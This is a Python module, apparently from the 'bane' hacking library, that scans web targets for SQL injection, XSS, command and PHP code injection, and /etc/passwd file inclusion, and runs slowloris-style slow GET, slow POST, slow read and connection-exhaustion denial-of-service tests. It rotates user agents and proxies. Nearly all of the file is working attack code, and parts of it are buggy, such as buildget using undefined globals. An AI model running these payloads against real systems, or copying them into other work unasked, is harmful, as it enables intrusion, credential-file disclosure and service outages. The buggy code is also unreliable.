import requests,socket,random,time,ssl
import bs4
from bs4 import BeautifulSoup
from bane.payloads import *
from bane.pager import inputs
def sqlieb(u,logs=True,returning=False,timeout=10,proxy=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
   check the response body for any SQL syntax errors.
   it's an "Error Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlieb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=False
 if proxy:
  proxy={'http':'http://'+proxy}
 if logs==True:
  print("[*]Error Based SQL Injection test")
 try:
  u+="'"
  rp= requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  r=rp.text
  if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
   s=True
 except Exception as e:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding boolean opertations to the link
   and check the response body for any change.
   it's an "Boolean Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlibb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 s=False
 try:
  if logs==True:
   print("[*]Boolean Based SQL Injection test")
  r=requests.get(u+"+and+1=2",proxies=proxy,timeout=timeout)
  q=requests.get(u+"+and+1=1",proxies=proxy,timeout=timeout)
  r1=r.text
  q1=q.text
  if ((r.status_code==200)and(q.status_code==200)):
   if ((r1!=q1) and (("not found" not in r1.lower()) and ("not found" not in q1.lower()))):
    s=True
 except:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding a delay statement at the end
   of the line and check the delay of the response.
   it's an "Time Based SQL Injection" test.

   the function takes 5 arguments:

   u: the link to check
   delay: time giving as a delay for the database to do before returning the response
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlitb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 25) timeout flag for the request
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 s=False
 if db.lower()=="mysql":
  sle="-SLEEP({})".format(delay)
 if db.lower()=="sql":
  sle="; WAIT FOR DELAY '00:00:{}'".format(delay)
 if db.lower()=="oracle":
  sle="BEGIN DBMS_LOCK.SLEEP({}); END;".format(delay)
 else:
  return None
 try:
  if logs==True:
   print("[*]Time Based SQL Injection test")
  t=time.time()
  r=requests.get(u+sle,proxies=proxy,timeout=timeout)
  if ((time.time()-t>=delay)and (r.status_code==200)):
    s=True
 except:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
  '''
   this function is for xss test with GET requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  try:
     c=requests.get(u, params= pl,headers = {'User-Agent': us},proxies=proxy,timeout=timeout).text
     if  xp in c:
      return True
  except Exception as e:
   pass
  return False
def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
  '''
   this function is for xss test with POST requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  try:
     c=requests.post(u, data= d,headers = {'User-Agent': us},proxies=proxy,timeout=timeout ).text
     if xp in c:
      return True 
  except Exception as e:
   pass
  return False
def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
  '''
   this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

   it takes the following arguments:
   
   u: link to test
   payload: the xss payload to use it, if it's set to: None (set by default to: None) it uses the default payload
   get: (set by default to: True) to test the parameter using GET
   post: (set by default to: True) to test the parameter using POST
   logs: (set by default to: True) show the process
   returning: (set by dfault to: False) to return scan results of the parameters as list of strings

   usage:
  
   >>>import bane
   >>>bane.xss('http://www.example.com/")

   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
  '''
  if proxy:
   proxy=proxy
  if proxies:
   proxy=random.choice(proxies)
  lst=[]
  if payload:
   xp=payload
  else:
   xp='<script>alert("Vulnerable!!!");</script>'
  if logs==True:
   print("Getting parameters...")
  hu=True
  l1=inputs(u,proxy=proxy,timeout=timeout,value=True)
  if len(l1)==0:
   if logs==True:
    print("No parameters were found!!!")
   hu=False
  if hu==True:
   extr=[]
   l=[]
   for x in l1:
    if (x.split(':')[1]!=''):
     extr.append(x)
    else:
     l.append(x)
   for x in extr:
    if x.split(':')[0] in l:
     extr.remove(x)
   if logs==True:
    print("Test has started...\nPayload:\n"+xp)
   if '?' in u:
    u=u.split('?')[0].split(',')[0]
   for i in l:
    user=None
    i=i.split(':')[0]
    try:
     if proxies:
      proxy=random.choice(proxies)
     pl={i : xp}
     extra={}
     if len(extr)!=0:
      for x in extr:
       a=x.split(':')[0]
       b=x.split(':')[1]
       extra.update({a:b})
     if get==True: 
      if fresh==True:
       extr=[]
       user=random.choice(ua)
       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True)
       for x in k:
        if (x.split(':')[1]!=''):
         extr.append(x)
       for x in extr:
        if x.split(':')[0] in l:
         extr.remove(x)
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
      if xssget(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout)==True:
         x="parameter: "+i+" method: GET=> [+]Payload was found"
      else:
       x="parameter: "+i+" method: GET=> [-]Payload was not found"
      lst.append(x)
      if logs==True:
       print (x)
     if post==True:
      if fresh==True:
       extr=[]
       user=random.choice(ua)
       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True)
       for x in k:
        if (x.split(':')[1]!=''):
         extr.append(x)
       for x in extr:
        if x.split(':')[0] in l:
         extr.remove(x)
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
      if xsspost(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout)==True:
      	x="parameter: "+i+" method: POST=> [+]Payload was found"
      else:
       x="parameter: "+i+" method: POST=> [-]Payload was not found"
      lst.append(x)
      if logs==True:
       print (x)
    except:
     break
   if returning==True:
    return lst
def execlink(u,timeout=10,proxy=None,logs=True,returning=False):
 '''
   this function is for command execution test using a given link
'''
 s=False
 if proxy:
  proxy={'http':'http://'+proxy}
 u+='%3Becho%20alaistestingyoursystem'
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s=True
 except:
  pass
 if logs==True:
  if s==True:
   print("[+]Vulnerable!!!")
  else:
   print("[-]Not vulnerable")
 if returning==True:
  return s
def execget(u,param='',value='',extra=None,timeout=10,proxy=None):
 '''
  this function is for command execution test using a given link and GET parameter
'''
 value+=";echo alaistestingyoursystem"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    return True
 except:
  pass
 return False
def execpost(u,param='',value='',extra=None,timeout=10,proxy=None):
 '''
  this function is for command execution test using a given link and POST parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 value+=";echo alaistestingyoursystem"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    return True
 except exception as e:
  pass
 return False
def phpget(u,param='',value='',end=False,extra=None,timeout=10,proxy=None):
 '''
  this function is for PHP code execution test using a given link and GET parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    return True
 except:
  pass
 return False
def phplink(u,end=False,timeout=10,proxy=None,logs=True,returning=False):
 '''
  this function is for PHP code execution test using a given link
'''
 s=False
 if proxy:
  proxy={'http':'http://'+proxy}
 u+="%3Becho'alawashere'"
 if end==True:
  u+="%3B"
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s= True
 except:
  pass
 if logs==True:
  if s==True:
   print("[+]Vulnerable!!!")
  else:
   print("[-]Not vulnerable")
 if returning==True:
  return s
def phppost(u,param='',value='',extra=None,end=False,timeout=10,proxy=None):
 '''
  this function is for PHP code execution test using a given link and POST parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    return True
 except:
  pass
 return False
def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=None,proxies=None,timeout=10):
 '''
   this function is for FI vulnerability test using a link
'''
 x={}
 if proxy:
  proxy={'http':'http://'+proxy}
 s=False
 l='etc/passwd'
 if (nullbyte==True):
  l+='%00'
 if ("=" not in u):
  return {"Status":s,"Reason":"doesn't work with such urls"}
 else:
  u=u.split("=")[0]+'='
 if mapping==True:
  for i in range(1,rounds+1):
   if proxies:
    proxy={'http':'http://'+random.choice(proxies)}
   try:
    if logs==True:
     print("[*]Trying:", u+l)
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s=True
     x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print("[+]FOUND!!!")
     break
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print("[-]Status Code:',r.status_code,',something is wrong...")
     break
    else:
     l='../'+l
     if logs==True:
      print("[-]Failed")
   except Exception as e:
    pass
 else:
  l='/etc/passwd'
  if (nullbyte==True):
   l+='%00'
  try:
    if logs==True:
     print("[*]Trying:", u+l)
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s=True
     x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print("[+]FOUND!!!")
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print("[-]Status Code:',r.status_code,',something went wrong...")
    else:
     if logs==True:
      print("[-]Failed")
  except Exception as e:
    if logs==True:
     print("[-]Error Failure")
 if s==False:
  x= {"Status":s,"Reason":"not vulnerable"}
 if returning==True:
  return x
'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''
def buildget(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s
def timeouttest(u,port=80,timeout=5,interval=30,logs=True,returning=False):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget:",u,"\nPort:",port,"\nInitial connection timeout:",timeout,"\nMax interval:",interval)
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 if i>0:
  j=0
  while True:
   try:
    j+=1
    if j>interval:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print("[+]Sleeping for',j,'seconds...")
    time.sleep(j)
   except:
    if logs==True:
     print("==>timed out at:',j,'seconds")
     break
    if returning==True:
     return j
  if j>interval:
   if logs==True:
    print("==>Test has reached the max interval:',interval,'seconds without timing out")
   if returning==True:
    return j
def slowgettest(u,port=80,timeout=5,interval=5,randomly=False,timer=180,logs=True,returning=False,start=1,end=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget:",u,"\nPort:",port,"\nInitial connection timeout:",timeout,"\nTest timer:",timer,"seconds")
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 if i>0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)>=timer:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(start,end)
    if logs==True:
     print("[+]Sleeping for',t,'seconds...")
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print("==>timed out at:',int(ti-j),'seconds")
    if returning==True:
     return int(ti-j)
    break
  if int(ti-j)>=timer:
   if logs==True:
    print("==>Test has reached the max interval:',interval,'seconds without timing out")
   if returning==True:
    return int(ti-j)
def connectionslimit(u,port=80,connections=150,timeout=5,timer=180,logs=True,returning=False,payloads=True):
 l=[]
 if logs==True:
  print("[*]Test has started:\nTarget:",u,"\nPort:",port,"\nConnections limit:",connections,"\nInitial connection timeout:",timeout,"\nTest timer:",timer,"seconds")
 ti=time.time()
 while True:
  if int(time.time()-ti)>=timer:
   if logs==True:
    print("[+]Maximum time for test has been reached!!!")
    break
   if returning==True:
    return len(l)
  if len(l)==connections:
   if logs==True:
    print("[+]Maximum number of connections has been reached!!!")
   if returning==True:
    return connections 
   break
  try:
   so=buildget(u,port,timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print("[!]Sockets:',len(l),'Time:',int(time.time()-ti),'seconds")
def buildpost(u,port=80,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,port))
 if port==443:
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u).encode("utf-8"))
 return s
def slowposttest(u,port=80,logs=True,timeout=5,size=10000,timer=180,returning=False,randomly=False,wait=1,start=1,end=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nData length to post: {}\nInitial connection timeout:{}\nTest timer: {} seconds".format(u,port,size,timeout,timer))
 try:
  s=buildpost(u,port,timeout,size)
  i+=1
 except Exception as e:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if int(time.time()-t)>=timer:
    if logs==True:
     print("[+]Maximum time has been reached!!!\n==>Size:",j,"\n==>Time:",int(time.time()-t))
    if returning==True:
     return int(time.time()-t)
    break
   if j==size:
    if logs==True:
     print("[+]Maximum size has been reached!!!\n==>Size:",j,"\n==>Time:",int(time.time()-t))
    if returning==True:
     return int(time.time()-t)
    break
   try:
    h=random.choice(lis)
    s.send(h.encode("utf-8"))
    j+=1
    if logs==True:
     print("Posted: {}".format(h))
    if randomly==True:
     time.sleep(random.randint(start,end))
    if randomly==False:
     time.sleep(wait)
   except Exception as e:
    if logs==True:
     print("[-]Cant send more\n==>Size: {}\n==>Time:".format(j,time.time()-t))
    if returning==True:
     return int(time.time()-t)
    break
def slowreadtest(u,port=80,logs=True,timeout=5,timer=180,returning=False,randomly=False,wait=5,start=1,end=10):
  i=0
  if logs==True:
   print("[*]Test has started:\nTarget: "+u+"\nPort: "+str(port)+"\nInitial connection timeout: "+str(timeout)+"\nTest timer: "+str(timer)+" seconds")
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti>=timer:
      if logs==True:
       print("[+]Maximum time has been reached!!!")
      if returning==True:
       return int(time.time()-ti)
      break
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u).encode("utf-8"))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q).encode("utf-8"))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print("Received: {}".format(d))
      print("sleeping...")
      if randomly==True:
       time.sleep(random.randint(start,end))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
  if logs==True:
   print("==>connection closed at: "+str(int(time.time()-ti))+" seconds")
  if returning==True:
   return int(time.time()-ti)
